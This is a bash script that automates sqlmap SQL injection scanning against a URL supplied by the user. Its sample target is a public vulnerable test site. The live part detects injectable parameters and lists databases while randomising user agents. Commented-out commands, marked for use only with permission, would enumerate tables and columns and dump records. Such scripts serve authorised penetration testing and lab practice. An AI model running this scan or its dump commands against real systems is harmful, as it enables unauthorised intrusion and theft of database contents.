#!/usr/bin/env bash
set -euo pipefail
URL="${1:?url required (example: http://testphp.vulnweb.com/artists.php?artist=1)}"
OUTDIR="${2:-outputs}"
mkdir -p "$OUTDIR"

LOG_PREFIX="$OUTDIR/sqlmap_$(date +%Y%m%d_%H%M%S)"
echo " Running sqlmap discovery for $URL"
# Non-destructive detection and DB listing
sqlmap -u "$URL" --batch --level=3 --risk=2 --threads=4 --random-agent --dbs --output-dir="$OUTDIR" | tee "$LOG_PREFIX.detect.txt"

# Parse for DBs in the detect log (grep)
echo " Grepping DB names into $LOG_PREFIX.dbs.txt"
grep -i "available databases" -A 10 "$LOG_PREFIX.detect.txt" || true

find "$OUTDIR" -maxdepth 2 -type f -name "*.txt" -print0 | xargs -0 grep -Ei "database:|available databases|web application DBMS" -n || true

# enumerate tables for a discovered DB (uncomment to enable after review)
# Replace <DBNAME> with the DB name printed above
# DBNAME="acutest"    # example placeholder
# sqlmap -u "$URL" -D "$DBNAME" --tables --batch --output-dir="$OUTDIR" | tee "$LOG_PREFIX.tables.txt"

# (commented to avoid mass exfiltration). Enable only with explicit intent & permission.
# sqlmap -u "$URL" -D "$DBNAME" -T "<table_name>" --columns --batch --output-dir="$OUTDIR" | tee "$LOG_PREFIX.columns.txt"
# sqlmap -u "$URL" -D "$DBNAME" -T "<table_name>" -C "id,name" --dump --batch --output-dir="$OUTDIR" | tee "$LOG_PREFIX.dump.txt"

echo "[*] sqlmap_scan: outputs saved in $OUTDIR (see sqlmap's output directory structure too)."
